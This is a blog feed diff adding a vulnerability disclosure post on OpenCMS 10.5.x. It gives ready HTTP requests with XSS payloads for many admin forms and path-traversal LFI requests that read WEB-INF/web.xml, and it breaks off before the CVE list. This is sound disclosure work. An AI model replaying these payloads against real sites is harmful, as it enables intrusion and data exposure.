@@ -1,4 +1,229 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-07-18T00:09:02+02:00</updated><id>/feed.xml</id><title type="html">CyberCoon</title><subtitle></subtitle><author><name>Aetsu</name><email></email></author><entry><title type="html">CoonShot - A Python script to take screenshots of web pages</title><link href="/CoonShot" rel="alternate" type="text/html" title="CoonShot - A Python script to take screenshots of web pages" /><published>2019-06-17T00:00:00+02:00</published><updated>2019-06-17T00:00:00+02:00</updated><id>/CoonShot</id><content type="html" xml:base="/CoonShot">&lt;p&gt;There are many tools on the Internet to make screenshots of web pages, being &lt;em&gt;&lt;a href=&quot;https://github.com/FortyNorthSecurity/EyeWitness&quot;&gt;EyeWitness&lt;/a&gt;&lt;/em&gt; the best I know. However, sometimes I had difficulties installing it and I ended up developing my own tool based on 
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.8.6">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2019-07-18T20:32:57+02:00</updated><id>/feed.xml</id><title type="html">CyberCoon</title><subtitle></subtitle><author><name>Aetsu</name><email></email></author><entry><title type="html">OpenCMS - OpenCMS Tales</title><link href="/OpenCms" rel="alternate" type="text/html" title="OpenCMS - OpenCMS Tales" /><published>2019-07-18T00:00:00+02:00</published><updated>2019-07-18T00:00:00+02:00</updated><id>/OpenCms</id><content type="html" xml:base="/OpenCms">&lt;p&gt;&lt;a href=&quot;https://github.com/alkacon/opencms-core&quot;&gt;OpenCMS&lt;/a&gt; is a robust open source CMS written in Java widely used on the Internet. So given his exposure and the possibilities I started playing with this CMS to see how it works.
+For the tests I used the version available in &lt;a href=&quot;https://hub.docker.com/r/alkacon/opencms-docker/&quot;&gt;hub.docker&lt;/a&gt; that allows a fast deployment if I “break” something.&lt;/p&gt;
+
+&lt;p&gt;The vulnerabilities affect versions 10.5.5 and 10.5.4, although I suppose the previous ones will also be affected. The latest version, the 11.x branch of OpenCMS, should fix these vulnerabilities.&lt;/p&gt;
+
+&lt;p&gt;I focused the tests on the default template &lt;strong&gt;&lt;a href=&quot;https://github.com/alkacon/apollo-template&quot;&gt;Apollo Template&lt;/a&gt;&lt;/strong&gt; and then, on the administration interface.&lt;/p&gt;
+
+&lt;p&gt;Starting from the external interface, there are two reflected &lt;a href=&quot;https://www.owasp.org/index.php/Cross-site_Scripting__Scripting_(XSS)&quot;&gt;XSS&lt;/a&gt;, one in the search engine and a second in the login form.&lt;/p&gt;
+
+&lt;p&gt;The payload used for the search engine is as described below:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;https://example.com/apollo-demo/search/index.html?facet_category_exact_ignoremax&amp;amp;q=demo%20examplez4e62%22%3e%3cscript%3ealert(1)%3c%2fscript%3ewhhpg&amp;amp;facet_type_ignoremax&amp;amp;facet_search.subsite_exact_ignoremax&amp;amp;reloaded&amp;amp;facet_query_query_ignoremax&amp;amp;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;img/xss_001.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;In the login form, the reflected XSS appears when the header &lt;strong&gt;X-Forwarded-For&lt;/strong&gt; is used as shown in the next request:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;GET /login/index.html?requestedResource=&amp;amp;name=Editor&amp;amp;password=editor&amp;amp;action=login HTTP/1.1
+Host: example.com
+X-Forwarded-For: .&amp;lt;img src=. onerror=alert('XSS')&amp;gt;.test.ninja
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;&lt;img src=&quot;img/xss_002.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;As for the administration interface, there are also some XSS…&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;In Site Management &amp;gt; New site (Stored XSS):&lt;/strong&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://192.168.0.110:8080/workplace#!/sites 
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Resource &lt;em&gt;title.0&lt;/em&gt;:&lt;/p&gt;
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/sites/new.jsp HTTP/1.1
+Host: example.com
+title.0=%3Csvg+onload%3Dalert%28%27Title%27%29%3E&amp;amp;sitename.0=%3Csvg+onload%3Dalert%28%27Folder+name%27%29%3E&amp;amp;server.0=%3Csvg+onload%3Dalert%28%27Server+URL%27%29%3E&amp;amp;errorPage.0=%2Fshared%2F&amp;amp;position.0=1.7014117E38&amp;amp;webserver.0=true&amp;amp;webserver.0.value=true&amp;amp;createou.0.value=false&amp;amp;template.0=%2Fsystem%2Fmodules%2Forg.opencms.apollo%2Ftemplates%2Fapollo-page.jsp&amp;amp;secureUrl.0=%3Csvg+onload%3Dalert%28%27Secure+server%27%29%3E&amp;amp;exclusiveUrl.0.value=false&amp;amp;exclusiveError.0.value=false&amp;amp;ok=Ok&amp;amp;elementname=undefined&amp;amp;path=%252Fsites%252Fnew&amp;amp;editaction=new&amp;amp;elementindex=0&amp;amp;action=save&amp;amp;closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Fsites&amp;amp;style=new&amp;amp;page=page1&amp;amp;framename=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+
+    &lt;p&gt;&lt;img src=&quot;img/xss_003.png&quot; alt=&quot;&quot; /&gt;
+  &lt;img src=&quot;img/xss_004.png&quot; alt=&quot;&quot; /&gt;
+  &lt;img src=&quot;img/xss_005.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Treeview (Reflected XSS):&lt;/strong&gt;&lt;br /&gt;
+Resource &lt;em&gt;type&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;http://example.com/opencms/system/workplace/views/explorer/tree_fs.jsp?type=&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;confirm(1)&amp;lt;/script&amp;gt;&amp;amp;includefiles=true&amp;amp;showsiteselector=true&amp;amp;projectaware=false&amp;amp;treesite=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;img/xss_006.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Login message (Stored XSS):&lt;/strong&gt;&lt;br /&gt;
+Resource &lt;em&gt;message.0&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/workplace/loginmessage.jsp HTTP/1.1
+Host: example.com 
+enabled.0=true&amp;amp;enabled.0.value=true&amp;amp;message.0=&amp;lt;svg onload=alert(1)&amp;gt;&amp;amp;loginForbidden.0.value=false&amp;amp;ok=Ok&amp;amp;elementname=undefined&amp;amp;path=%252Fworkplace%252Floginmessage&amp;amp;elementindex=0&amp;amp;action=save&amp;amp;closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Fworkplace&amp;amp;style=new&amp;amp;page=page1&amp;amp;framename=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;img/xss_007.png&quot; alt=&quot;&quot; /&gt;
+  When a user logs in:
+  &lt;img src=&quot;img/xss_008.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Index sources &amp;gt; View index sources &amp;gt; New index source (Stored XSS):&lt;/strong&gt;
+&lt;img src=&quot;img/xss_009.png&quot; alt=&quot;&quot; /&gt;
+Resource &lt;em&gt;name.0&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/searchindex/indexsource-new.jsp HTTP/1.1
+Host: example.com
+name.0=%3Csvg+onload%3Dalert%28%27Name%27%29%3E&amp;amp;indexerClassName.0=org.opencms.search.CmsVfsIndexer&amp;amp;ok=Ok&amp;amp;elementname=undefined&amp;amp;path=%252Fsearchindex%252Findexsources%252Findexsource-new&amp;amp;elementindex=0&amp;amp;action=save&amp;amp;closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Fsearchindex%252Findexsources%2526action%253Dinitial&amp;amp;style=new&amp;amp;page=page1&amp;amp;framename=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;img/xss_010.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Index sources &amp;gt; View field configuration &amp;gt; New field configuration (Stored XSS):&lt;/strong&gt;&lt;br /&gt;
+&lt;img src=&quot;img/xss_011.png&quot; alt=&quot;&quot; /&gt;
+Resource &lt;em&gt;name.0&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/searchindex/fieldconfiguration-new.jsp HTTP/1.1
+Host: example.com
+name.0=%3Csvg+onload%3Dalert%28%27Name%27%29%3E&amp;amp;ok=Ok&amp;amp;elementname=undefined&amp;amp;path=%252Fsearchindex%252Ffieldconfigurations%252Ffieldconfiguration-new&amp;amp;elementindex=0&amp;amp;action=save&amp;amp;closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Fsearchindex%252Ffieldconfigurations%2526action%253Dinitial&amp;amp;style=new&amp;amp;page=page1&amp;amp;framename=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;img/xss_012.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Account Management &amp;gt; Impor/Export user data (Reflected XSS):&lt;/strong&gt;&lt;br /&gt;
+Resource &lt;em&gt;oufqn&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/accounts/imexport_user_data/export_csv.jsp HTTP/1.1
+Host: example.com
+groups.0=Users&amp;amp;ok=Ok&amp;amp;oufqn=&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;confirm(1)&amp;lt;/script&amp;gt;&amp;amp;elementname=undefined&amp;amp;path=%252Faccounts%252Forgunit%252Fimexport%252Fexportcsv&amp;amp;elementindex=0&amp;amp;action=save&amp;amp;closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Faccounts%252Forgunit%252Fimexport%2526action%253Dinitial&amp;amp;style=new&amp;amp;page=page1&amp;amp;framename=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;img/xss_013.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Account Management &amp;gt; Group Management &amp;gt; New Group (Stored XSS):&lt;/strong&gt;
+&lt;img src=&quot;img/xss_014.png&quot; alt=&quot;&quot; /&gt;
+Resources &lt;em&gt;name.0&lt;/em&gt; and &lt;em&gt;description.0&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/accounts/group_new.jsp HTTP/1.1
+Host: example.com
+name.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Name%27%29%3E&amp;amp;description.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Description%27%29%3E&amp;amp;assignedOu.0=root+organizational+unit+%28%2F%29&amp;amp;enabled.0=true&amp;amp;enabled.0.value=true&amp;amp;ok=Ok&amp;amp;oufqn=&amp;amp;elementname=undefined&amp;amp;path=%252Faccounts%252Forgunit%252Fgroups%252Fnew&amp;amp;elementindex=0&amp;amp;action=save&amp;amp;closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Faccounts%252Forgunit%252Fgroups%2526action%253Dinitial&amp;amp;style=new&amp;amp;page=page1&amp;amp;framename=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;img/xss_015.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Account Management &amp;gt; Organizational Unit &amp;gt; Organizational Unit Management &amp;gt; New sub organizational unit (Stored XSS):&lt;/strong&gt;&lt;br /&gt;
+Resources &lt;em&gt;parentOuDesc.0&lt;/em&gt; and &lt;em&gt;resources.0&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/accounts/unit_new.jsp HTTP/1.1
+Host: example.com
+name.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Name%27%29%3E&amp;amp;description.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Description%27%29%3E&amp;amp;parentOuDesc.0=&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;confirm(1)&amp;lt;/script&amp;gt;&amp;amp;nologin.0.value=false&amp;amp;webusers.0.value=false&amp;amp;resources.0=%2F&amp;amp;ok=Ok&amp;amp;oufqn=&amp;amp;elementname=undefined&amp;amp;path=%252Faccounts%252Forgunit%252Fmgmt%252Fnew&amp;amp;elementindex=0&amp;amp;action=save&amp;amp;closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Faccounts%252Forgunit%252Fmgmt%2526action%253Dinitial&amp;amp;style=new&amp;amp;page=page1&amp;amp;framename=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;img/xss_016.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Link Validator &amp;gt; External Link Validator &amp;gt; Validate External Links (Reflected XSS):&lt;/strong&gt;&lt;br /&gt;
+Resources &lt;em&gt;reporttype&lt;/em&gt;, &lt;em&gt;reportcontinuekey&lt;/em&gt; and &lt;em&gt;title&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/views/admin/admin-main.jsp?path=%2Flinkvalidation%2Fexternal%2Fvalidateexternallinks HTTP/1.1
+Host: example.com
+dialogtype=imp&amp;amp;reporttype=extended66955%22%3balert(1)%2f%2f297&amp;amp;reportcontinuekey=&amp;amp;title=External%2BLink%2BValidation&amp;amp;path=%252Flinkvalidation%252Fexternal%252Fvalidateexternallinks&amp;amp;threadhasnext=&amp;amp;action=confirmed&amp;amp;closelink=%252Fsystem%252Fworkplace%252Fviews%252Fadmin%252Fadmin-main.jsp%253Fpath%253D%252Flinkvalidation%252Fexternal&amp;amp;style=new&amp;amp;framename=&amp;amp;ok=OK
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;img/xss_017.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Administrator view &amp;gt; Database management &amp;gt; Extended html import &amp;gt; Default html values (Reflected XSS):&lt;/strong&gt;&lt;br /&gt;
+Resources &lt;em&gt;destinationDir.0&lt;/em&gt;, &lt;em&gt;imageGallery.0&lt;/em&gt;, &lt;em&gt;linkGallery.0&lt;/em&gt;, &lt;em&gt;downloadGallery.0&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/database/htmlimport/htmldefault.jsp HTTP/1.1
+Host: example.com
+------WebKitFormBoundaryLyJOmAtrd8ArxNqf
+Content-Disposition: form-data; name=&quot;inputDir.0&quot;
+.
+------WebKitFormBoundaryLyJOmAtrd8ArxNqf
+Content-Disposition: form-data; name=&quot;destinationDir.0&quot;
+/whbo0&quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;nrbhd
+------WebKitFormBoundaryLyJOmAtrd8ArxNqf
+Content-Disposition: form-data; name=&quot;imageGallery.0&quot;
+------WebKitFormBoundaryLyJOmAtrd8ArxNqf
+Content-Disposition: form-data; name=&quot;downloadGallery.0&quot;
+------WebKitFormBoundaryLyJOmAtrd8ArxNqf
+Content-Disposition: form-data; name=&quot;linkGallery.0&quot;
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;img/xss_019.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Administrator view &amp;gt; Database management &amp;gt; Extended html import &amp;gt; Default html values (Reflected XSS):&lt;/strong&gt;&lt;br /&gt;
+Resources &lt;em&gt;destinationDir.0&lt;/em&gt;, &lt;em&gt;imageGallery.0&lt;/em&gt;, &lt;em&gt;linkGallery.0&lt;/em&gt; and &lt;em&gt;downloadGallery.0&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/database/htmlimport/htmlimport.jsp HTTP/1.1
+Host: example.com
+------WebKitFormBoundary6fy3ENawtXT0qmgB
+Content-Disposition: form-data; name=&quot;inputDir.0&quot;
+gato
+------WebKitFormBoundary6fy3ENawtXT0qmgB
+Content-Disposition: form-data; name=&quot;destinationDir.0&quot;
+testszfgw&quot;&amp;gt;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;vqln7
+------WebKitFormBoundary6fy3ENawtXT0qmgB
+Content-Disposition: form-data; name=&quot;imageGallery.0&quot;
+test
+------WebKitFormBoundary6fy3ENawtXT0qmgB
+Content-Disposition: form-data; name=&quot;downloadGallery.0&quot;
+test
+------WebKitFormBoundary6fy3ENawtXT0qmgB
+Content-Disposition: form-data; name=&quot;linkGallery.0&quot;
+test
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;&lt;img src=&quot;img/xss_020.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;In addition to the XSS shown, I have also identified five Local FIle Inclusion &lt;a href=&quot;https://www.owasp.org/index.php/Testing_for_Local_File_Inclusion_for_Local_File_Inclusion&quot;&gt;LFI&lt;/a&gt; vulnerabilities. For the tests, I used the payloads:&lt;/p&gt;
+&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;…%2f…%2fWEB-INF%2flogs%2fopencms.log
+…%2f…%2fWEB-INF%2fweb.xml
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;The affected resources are:&lt;/p&gt;
+&lt;ul&gt;
+  &lt;li&gt;&lt;strong&gt;LFI (I):&lt;/strong&gt;&lt;br /&gt;
+Resource &lt;em&gt;closelink&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/workplace/loginmessage.jsp HTTP/1.1
+Host: example.com
+enabled.0=true&amp;amp;enabled.0.value=true&amp;amp;message.0=%3Cimg+src%3D.+onerror%3Dalert%281%29%3E%0D%0A&amp;amp;loginForbidden.0.value=false&amp;amp;timeStart.0=1%2F3%2F2000+12%3A00+AM&amp;amp;ok=Ok&amp;amp;elementname=undefined&amp;amp;path=%252Fworkplace%252Floginmessage&amp;amp;elementindex=0&amp;amp;action=save&amp;amp;closelink=..%2f..%2fWEB-INF%2fweb.xml&amp;amp;style=new&amp;amp;page=page1&amp;amp;framename=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+    &lt;p&gt;Part of the response:&lt;/p&gt;
+    &lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[...]
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;filter&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;CmsJsonPartFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-class&amp;gt;&lt;/span&gt;org.opencms.jsp.jsonpart.CmsJsonPartFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-class&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter&amp;gt;&lt;/span&gt;
+ &lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;OpenCmsUrlServletFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt; 
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-mapping&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;filter-name&amp;gt;&lt;/span&gt;CmsJsonPartFilter&lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-name&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;url-pattern&amp;gt;&lt;/span&gt;/opencms/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/url-pattern&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;dispatcher&amp;gt;&lt;/span&gt;REQUEST&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dispatcher&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;dispatcher&amp;gt;&lt;/span&gt;FORWARD&lt;span class=&quot;nt&quot;&gt;&amp;lt;/dispatcher&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/filter-mapping&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;OpenCmsServlet&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;/opencms/*&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;/context-param&amp;gt;&lt;/span&gt;
+
+  &lt;span class=&quot;nt&quot;&gt;&amp;lt;context-param&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-name&amp;gt;&lt;/span&gt;DefaultWebApplication&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-name&amp;gt;&lt;/span&gt;
+      &lt;span class=&quot;nt&quot;&gt;&amp;lt;param-value&amp;gt;&lt;/span&gt;ROOT&lt;span class=&quot;nt&quot;&gt;&amp;lt;/param-value&amp;gt;&lt;/span&gt;
+[...]
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;LFI (II):&lt;/strong&gt;&lt;br /&gt;
+Resource &lt;em&gt;closelink&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/contenttools/reports/xmlcontentrepair.jsp HTTP/1.1
+Host: example.com
+reporttype=extended&amp;amp;reportcontinuekey=&amp;amp;thread=dcbb6737-661b-11e9-a9fc-0242ac11002b&amp;amp;threadhasnext=false&amp;amp;action=reportend&amp;amp;closelink=..%2f..%2fWEB-INF%2fweb.xml&amp;amp;style=new&amp;amp;ok=Ok
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;LFI (III):&lt;/strong&gt;&lt;br /&gt;
+Resource &lt;em&gt;closelink&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/accounts/group_new.jsp HTTP/1.1
+Host: example.com
+name.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Name%27%29%3E&amp;amp;description.0=%3Cimg+src%3D.+onerror%3Dalert%28%27Description%27%29%3E&amp;amp;assignedOu.0=root+organizational+unit+%28%2F%29&amp;amp;enabled.0=true&amp;amp;enabled.0.value=true&amp;amp;ok=Ok&amp;amp;oufqn=&amp;amp;elementname=undefined&amp;amp;path=%252Faccounts%252Forgunit%252Fgroups%252Fnew&amp;amp;elementindex=0&amp;amp;action=save&amp;amp;closelink=..%2f..%2fWEB-INF%2fweb.xml&amp;amp;style=new&amp;amp;page=page1&amp;amp;framename=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;LFI (IV):&lt;/strong&gt;&lt;br /&gt;
+Resource &lt;em&gt;closelink&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/history/settings/index.jsp HTTP/1.1
+Host: example.com
+versions.0=10&amp;amp;mode.0=2&amp;amp;ok=OK&amp;amp;elementname=undefined&amp;amp;path=%252Fhistory%252Fsettings&amp;amp;elementindex=0&amp;amp;action=save&amp;amp;closelink=..%2f..%2fWEB-INF%2fweb.xml&amp;amp;style=new&amp;amp;page=page1&amp;amp;framename=
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;LFI (V):&lt;/strong&gt;
+Resource &lt;em&gt;closelink&lt;/em&gt;:
+    &lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;POST /system/workplace/admin/history/reports/clearhistory.jsp HTTP/1.1
+Host: example.com
+reporttype=extended&amp;amp;reportcontinuekey=&amp;amp;thread=ac0bbd5f-66cd-11e9-ae09-0242ac11002b&amp;amp;classname=org.opencms.workplace.tools.history.CmsHistoryClearDialog&amp;amp;threadhasnext=false&amp;amp;action=reportend&amp;amp;closelink=..%2f..%2fWEB-INF%2fweb.xml&amp;amp;style=new&amp;amp;ok=OK
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;All vulnerabilities are included in the CVEs:&lt;/p&gt;
